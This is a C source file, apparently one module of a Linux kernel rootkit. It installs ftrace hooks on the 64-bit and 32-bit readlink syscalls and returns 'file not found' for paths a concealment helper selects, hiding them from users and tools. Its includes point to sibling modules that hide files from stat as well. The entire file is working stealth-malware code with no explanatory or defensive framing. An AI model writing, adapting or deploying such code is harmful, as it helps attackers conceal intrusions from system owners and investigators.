#include "../include/ub_core.h"
#include "../include/hiding_readlink.h"
#include "../ftrace/hook_engine.h"
#include "../include/hiding_stat.h"

static asmlinkage long (*ub_real_readlink)(const struct pt_regs *);
static asmlinkage long (*ub_real_readlink32)(const struct pt_regs *);

static notrace asmlinkage long ub_hook_readlink(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;

    if (ub_should_conceal_path(pathname)) {
        return -ENOENT;
    }
    return ub_real_readlink(regs);
}

static notrace asmlinkage long ub_hook_readlink32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;

    if (ub_should_conceal_path(pathname)) {
        return -ENOENT;
    }
    return ub_real_readlink32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_readlink", ub_hook_readlink, &ub_real_readlink),
    HOOK("__ia32_sys_readlink", ub_hook_readlink32, &ub_real_readlink32),
};

notrace int ub_linkguard_start(void) {
    return ub_fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void ub_linkguard_stop(void) {
    ub_fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
